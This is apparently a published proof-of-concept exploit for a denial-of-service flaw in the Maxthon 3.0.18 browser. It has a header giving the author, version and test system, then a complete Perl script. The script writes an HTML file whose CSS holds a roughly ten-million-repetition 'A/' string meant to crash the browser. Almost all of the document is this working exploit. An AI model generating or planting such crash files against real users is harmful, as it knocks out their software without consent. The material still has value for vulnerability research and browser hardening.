# 
######################################################################################### 
#                                                                                       # 
#  Title: Maxthon 3.0.18.1000 CSS Denial of Service Vulnerability                       # 
#  Author: 4n0nym0us (Arash Sa'adatfar)                                                 # 
#  Developer: Maxthon International                                                     # 
#  Version:3.0.18                                                                       # 
#  Software Link: http://dl.maxthon.com/mx3/mx3.0.18.1000.exe                           # 
#                                                                                       # 
#  Tested On: Windows 7 Ultimate 32-bit                                                 # 
#                                                                                       # 
######################################################################################### 
# 
#!/usr/bin/perl 
my $file= "Crash.html"; 
my $junk= "A/" x 10000000;  
open($FILE,">$file"); 
print $FILE "<html>\n<head>\n<style type='text/css'>\nbody {alink: ".$junk."}\n</style>\n</head>\n</html>"; 
print "\nCrash.html File Created successfully\n"; 
close($FILE);